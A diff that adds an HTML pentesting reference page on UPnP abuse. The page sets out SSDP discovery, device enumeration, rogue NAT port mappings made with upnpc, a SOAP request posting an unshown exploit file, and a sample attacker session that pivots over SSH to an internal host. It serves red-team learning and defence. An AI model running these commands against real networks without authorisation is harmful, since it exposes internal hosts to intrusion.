@@ -1,0 +1,178 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">UPnP Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Network Services</strong> • Focus: <strong>UPnP Abuse & NAT Bypass</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    UPnP (Universal Plug and Play, UDP/1900) allows devices to automatically discover 
+    and configure services on a network. Many implementations lack authentication, 
+    exposing sensitive functions like port forwarding and device info leaks. 
+    Attackers exploit UPnP for reconnaissance, NAT traversal, and sometimes remote 
+    code execution through vulnerable SOAP requests. Misconfigured UPnP has been 
+    weaponized in DDoS botnets (e.g., Mirai, Pinkslipbot) and is a critical risk 
+    in IoT-heavy environments.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>No Authentication:</strong> Most UPnP services respond to anyone on the network.</li>
+    <li><strong>Information Disclosure:</strong> Device descriptions expose firmware, OS, and services.</li>
+    <li><strong>NAT Traversal:</strong> Attackers can add rogue port forwarding rules.</li>
+    <li><strong>SOAP Injection:</strong> Malformed XML requests can lead to RCE on vulnerable devices.</li>
+    <li><strong>DDoS Amplification:</strong> UPnP abused in large-scale reflection attacks.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify devices via SSDP M-SEARCH queries on UDP/1900.</li>
+    <li><strong>Enumeration:</strong> Retrieve device descriptions and service endpoints.</li>
+    <li><strong>Abuse:</strong> Add malicious NAT port mappings or query sensitive info.</li>
+    <li><strong>Exploitation:</strong> Deliver crafted SOAP requests for RCE if vulnerable.</li>
+    <li><strong>Impact:</strong> Internal network mapping, device compromise, botnet recruitment.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan and detect UPnP devices via SSDP broadcast.</li>
+    <li>Fetch device XML descriptions to learn endpoints.</li>
+    <li>Test for NAT injection (rogue port mappings).</li>
+    <li>Craft malicious SOAP requests for exploitation.</li>
+    <li>Leverage results for pivoting, DDoS, or RCE.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery (SSDP)
+# ------------------------------
+nmap -sU -p1900 --script upnp-info [target/subnet]
+gssdp-discover -i eth0
+
+# Manual M-SEARCH query
+echo -ne "M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:upnp:rootdevice\r\nMX:2\r\nMAN:\"ssdp:discover\"\r\n\r\n" \
+| nc -u -w 2 239.255.255.250 1900
+
+# ------------------------------
+# Fetch Device Description
+# ------------------------------
+curl http://[target]:[port]/rootDesc.xml
+curl http://[target]:[port]/igd.xml
+
+# ------------------------------
+# Add Rogue Port Forward
+# ------------------------------
+upnpc -a 192.168.1.50 22 2222 tcp
+upnpc -l
+
+# ------------------------------
+# SOAP Exploitation
+# ------------------------------
+curl -d @exploit.xml http://[target]:[port]/upnp/control/WANIPConn1 \
+  -H "SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -sU -p1900 --script upnp-info 192.168.1.0/24
+upnpc -a 192.168.1.100 22 2222 tcp
+ssh -p 2222 user@public_ip
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -sU -p1900 --script upnp-info 192.168.1.1
+PORT     STATE SERVICE
+1900/udp open  upnp
+| upnp-info: 
+|   192.168.1.1:1900
+|   Server: Linux/3.10.14, UPnP/1.0, MiniUPnPd/1.4
+|   Location: http://192.168.1.1:5000/rootDesc.xml
+
+[ saide ~ ]$ curl http://192.168.1.1:5000/rootDesc.xml
+&lt;device&gt;
+  &lt;friendlyName&gt;HomeRouter&lt;/friendlyName&gt;
+  &lt;manufacturer&gt;VendorCorp&lt;/manufacturer&gt;
+  &lt;modelName&gt;RouterX-5000&lt;/modelName&gt;
+&lt;/device&gt;
+
+[ saide ~ ]$ upnpc -a 192.168.1.50 22 2222 tcp
+External IP address: 203.0.113.10
+added mapping tcp 2222 → 192.168.1.50:22
+
+[ saide ~ ]$ ssh -p 2222 user@203.0.113.10
+user@victim:~$ whoami
+user
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample UPnP exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# UPnP Discovery
+Device: RouterX-5000
+Manufacturer: VendorCorp
+External IP: 203.0.113.10
+
+# Rogue NAT Rule
+tcp 2222 → 192.168.1.50:22
+
+# Exploitation Proof
+Connected via external IP using SSH over rogue port mapping
+Pivot achieved into internal host
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-upnp" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting UPnP
+      </a>
+    </li>
+    <li>
+      <a href="https://www.us-cert.cisa.gov/ncas/alerts/TA13-024A" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        US-CERT – UPnP Vulnerabilities
+      </a>
+    </li>
+    <li>Red Team workflow: UPnP discovery → Device info → Rogue port forward → Internal pivot → (Optional SOAP RCE).</li>
+  </ul>
+</section>
